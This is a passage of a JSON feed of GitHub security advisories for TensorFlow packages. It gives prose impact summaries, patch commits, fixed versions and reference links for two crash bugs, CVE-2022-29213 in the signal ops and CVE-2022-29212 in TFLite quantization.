href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow-gpu] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow-gpu] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow-cpu] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow-cpu] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow-cpu] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>tf.compat.v1.signal.rfft2d</code> and <code>tf.compat.v1.signal.rfft3d</code> lack input validation and under certain condition can result in crashes (due to <code>CHECK</code>-failures).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">0a8a781e597b18ead006d19b7d23d0a369e9ad73</a> (merging GitHub PR <a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">#55274</a>).</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5889-7v45-q28m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29213\">https://nvd.nist.gov/vuln/detail/CVE-2022-29213</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/55263\">https://github.com/tensorflow/tensorflow/issues/55263</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/pull/55274\">https://github.com/tensorflow/tensorflow/pull/55274</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73\">https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5889-7v45-q28m\">https://github.com/advisories/GHSA-5889-7v45-q28m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5889-7v45-q28m",
            "title": "[tensorflow] Incomplete validation in signal ops leads to crashes",
            "date_modified": "2022-05-24T22:16:32.000Z",
            "date_published": "2022-05-24T22:16:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5889-7v45-q28m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Certain TFLite models that were created using TFLite model converter would crash when loaded in the TFLite interpreter. The culprit is that during quantization the scale of values could be greater than 1 but code was always assuming sub-unit scaling.</p>\n<p>Thus, since code was calling <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123\"><code>QuantizeMultiplierSmallerThanOneExp</code></a>, the <code>TFLITE_CHECK_LT</code> assertion would trigger and abort the process.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8\">a989426ee1346693cc015792f11d715f6944f2b8</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported externally via a <a href=\"https://github.com/tensorflow/tensorflow/issues/43661\">GitHub issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8wwm-6264-x792\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8wwm-6264-x792</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29212\">https://nvd.nist.gov/vuln/detail/CVE-2022-29212</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/issues/43661\">https://github.com/tensorflow/tensorflow/issues/43661</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8\">https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8wwm-6264-x792\">https://github.com/advisories/GHSA-8wwm-6264-x792</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8wwm-6264-x792",
            "title": "[tensorflow-gpu] Core dump when loading TFLite models with quantization",
            "date_modified": "2022-05-24T22:16:09.000Z",
            "date_published": "2022-05-24T22:16:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8wwm-6264-x792"
            }
        }
    ]
}